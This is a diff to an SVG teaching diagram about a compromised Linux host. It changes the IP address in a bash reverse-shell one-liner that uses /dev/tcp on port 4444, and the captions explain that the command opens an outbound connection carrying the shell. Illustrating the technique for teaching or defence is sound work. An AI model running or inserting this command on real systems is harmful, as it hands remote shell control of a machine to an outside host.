@@ -27,7 +27,7 @@
   <rect class="victim" x="30" y="55" width="300" height="150" rx="10"/>
   <text class="ui t" x="46" y="80">Compromised Linux host</text>
   <text class="ui s" x="46" y="102">The attacker's code runs this:</text>
-  <text class="ui mono cyan" x="46" y="126">bash -i &gt;&amp; /dev/tcp/185.4.2.9/4444 0&gt;&amp;1</text>
+  <text class="ui mono cyan" x="46" y="126">bash -i &gt;&amp; /dev/tcp/203.0.113.29/4444 0&gt;&amp;1</text>
   <text class="ui s" x="46" y="150">/dev/tcp is a bash feature — no tool</text>
   <text class="ui s" x="46" y="166">to install. It opens an OUTBOUND</text>
   <text class="ui s" x="46" y="182">connection and hands the shell over it.</text>
